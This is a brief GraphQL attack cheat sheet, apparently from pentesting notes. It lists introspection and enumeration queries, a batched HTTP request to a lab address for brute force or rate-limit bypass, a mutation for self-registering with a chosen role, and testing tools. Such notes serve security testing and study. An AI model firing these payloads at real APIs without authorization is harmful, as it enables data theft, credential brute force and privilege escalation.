#web #graphql #introspection #api

# Attacking GraphQL

Related: [web-requests](web-requests.md) · [injection-attacks](injection-attacks.md) · [auth-attacks](auth-attacks.md)

## Enumerate Data
```graphql
{ users { id username role } }
```
Query objects/fields directly.

## Introspection
```graphql
{ __schema { types { name } } }
```
List all types in the schema.

```graphql
{ __schema { queryType { fields { name description } } } }
```
List available queries.

```graphql
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }
```
Full introspection query (expand with FullType/InputValue/TypeRef fragments).

## Batching (brute-force / rate-limit bypass)
```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Type: application/json

[{"query":"{user(username: \"admin\") {uuid}}"},{"query":"{post(id: 1) {title}}"}]
```
Send multiple queries in one request.

## Mutations
```graphql
mutation { registerUser(input: {username: "vautia", password: "...", role: "user"}) { user { username role } } }
```
Abuse a mutation (e.g. self-register or set a privileged role).

## Tools
```
graphw00f    # fingerprint the GraphQL engine
InQL         # Burp extension for introspection
GraphQL-Cop   # security audit of common misconfigs
graphql-voyager  # visualize the schema
```
GraphQL testing toolkit.
